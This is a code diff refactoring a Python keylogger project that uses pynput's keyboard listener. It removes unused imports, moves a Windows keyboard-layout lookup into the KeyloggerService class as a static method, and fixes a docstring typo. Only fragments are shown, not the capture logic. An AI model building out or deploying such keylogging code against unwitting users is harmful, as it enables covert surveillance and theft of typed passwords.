@@ -1,19 +1,9 @@
 from abc import ABC, abstractmethod
 from typing import List
-import time
-from pynput.keyboard import Key, Listener
-import threading
+from pynput.keyboard import  Listener
 import ctypes
 import locale
 
-
-def get_current_language():
-    layout = ctypes.windll.user32.GetKeyboardLayout(0)
-    lang_id = layout & 0xFFFF
-    try:
-        return locale.windows_locale[lang_id]
-    except KeyError:
-        raise KeyError(f"Unknown language ID: 0x{lang_id:X}")
 
 
 class IKeyLogger(ABC):
@@ -34,7 +24,7 @@ class IKeyLogger(ABC):
 
 class KeyloggerService(IKeyLogger):
     """""
-    abstract class for start capture preses and stop methodes
+    abstract class for start capture preses and stop methods
     and return logg keys
     """""
 
@@ -74,6 +64,16 @@ class KeyloggerService(IKeyLogger):
 
     def get_logged_keys(self) -> List[str]:
         return list(self.keys)
+
+
+    @staticmethod
+    def get_current_language():
+        layout = ctypes.windll.user32.GetKeyboardLayout(0)
+        lang_id = layout & 0xFFFF
+        try:
+            return locale.windows_locale[lang_id]
+        except KeyError:
+            raise KeyError(f"Unknown language ID: 0x{lang_id:X}")
 
 
 if __name__ == "__main__":
